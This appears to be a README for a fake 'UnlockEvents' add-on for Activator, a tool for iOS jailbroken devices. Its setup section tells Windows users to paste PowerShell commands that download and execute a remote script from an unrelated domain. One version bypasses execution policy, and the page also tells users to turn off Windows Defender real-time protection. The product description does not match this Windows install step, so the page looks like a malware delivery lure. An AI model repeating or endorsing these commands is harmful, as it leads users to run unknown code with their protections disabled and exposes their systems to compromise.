<div align="center">

# UnlockEvents: Unlocking Events for Activator – Browser Add-on

![preview](https://raw.githubusercontent.com/Cesar-Code1/unlock-events/main/cover_dd380.svg)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-SCRIPT-84cc16?style=flat-square&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-312K-a3e635?style=flat-square&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-ACTIVE-2ea44f?style=flat-square&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/OS-WINDOWS-65a30d?style=flat-square&labelColor=0d1117)]()

</div>

---

UnlockEvents extends Activator by adding three dedicated unlocking events: unlock canceled, unlock failed, and unlock succeeded. These events let you trigger actions based on the outcome of each unlock attempt. The extension is designed to integrate directly with existing Activator workflows without additional configuration.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

Adds three unlocking events for Activator:

- Unlock canceled
- Unlock failed
- Unlock succeeded

Events fire only when an unlock attempt reaches a definite outcome, so workflows can branch on cancellation, failure, or success without polling device state.

Lightweight: no background services, no configuration required beyond enabling the extension. Integrates directly with Activator's event system and stays out of the way until an unlock attempt occurs.

## How it works

Registers three new Activator events that fire based on the device unlock lifecycle:

- Unlock canceled — triggered when an unlock attempt is interrupted before completion.
- Unlock failed — triggered when the unlock attempt does not succeed.
- Unlock succeeded — triggered when the device unlocks successfully.

Each event is dispatched through Activator's existing event system, so it can be bound to any action or gesture the same way as built-in events. No additional configuration is required beyond enabling the extension.

## Credits

Built for Activator. Provides three unlock events: unlock canceled, unlock failed, and unlock succeeded. Any code not original to this project is attributed to its source. If use of any included code infringes on your rights, report it so it can be resolved promptly. When reusing this code in your own software, credit the sources.

## License

This project is provided for use in your own software. If you include it in your work, please credit the original source. Code not written by the project authors includes links to its source; if you believe your copyright is being violated, please reach out so it can be resolved.